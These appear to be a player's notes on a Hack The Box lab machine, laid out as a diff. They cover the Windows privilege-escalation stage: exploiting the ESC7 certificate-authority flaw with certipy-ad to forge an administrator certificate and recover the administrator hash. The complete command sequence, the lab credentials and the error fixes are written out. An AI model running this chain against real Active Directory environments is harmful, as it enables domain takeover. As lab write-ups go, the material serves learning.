@@ -1,0 +1,46 @@
+Root flag --- Windows Priv Esc 
+Downloading winpeas in the machine did not find anything.
+
+  checked groups and user info but nothing valuable.
+
+Use certipy (certipy-ad) 
+ certipy-ad find -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -vulnerable -stdout 
+  we get ESC7 vulnerability
+
+https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#attack-2
+hacktricks got the whole attack path to do it
+  
+  certipy-ad ca -ca 'manager-DC01-CA' -add-officer raven -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'
+  	[*] Successfully added officer 'Raven' on 'manager-DC01-CA'
+
+  certipy-ad ca -ca 'manager-DC01-CA' -enable-template SubCa -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'
+  [*] Successfully enabled 'SubCA' on 'manager-DC01-CA'
+  
+  certipy-ad req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -target manager.htb -template SubCA -upn administrator@manager.htb
+  This request will be denied, but we will save the private key and note down the request ID.
+[*] Saved private key to 13.key
+	[-] Failed to request certificate
+
+  certipy-ad ca -ca manager-DC01-CA -issue-request 13 -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'
+  [*] Successfully issued certificate
+
+certipy-ad req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -target manager.htb -retrieve 13
+  [*] Loaded private key from '13.key'
+	[*] Saved certificate and private key to 'administrator.pfx'
+
+  Try to connect with certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.236
+  if error([-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_BAD_INTEGRITY(Integrity check on decrypted field failed))
+        you need to activate a Python virtual environment
+        python3 -m venv /home/kali/name
+        source /home/kali/name/bin/activate
+        for more info https://medium.com/@pklmn/manager-htb-writeup-e60b56a58bb1
+if else error ([-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great))
+        occurs when there is a significant time difference between the local system and the remote server, sync your time
+        timedatectl set-ntp 0 && rdate -n 10.10.11.236 OR sudo ntpdate -u manager.htb
+else
+  Obtain administrator hash
+[*] Got hash for 'administrator@manager.htb': "******:*****"
+  
+
+
+  
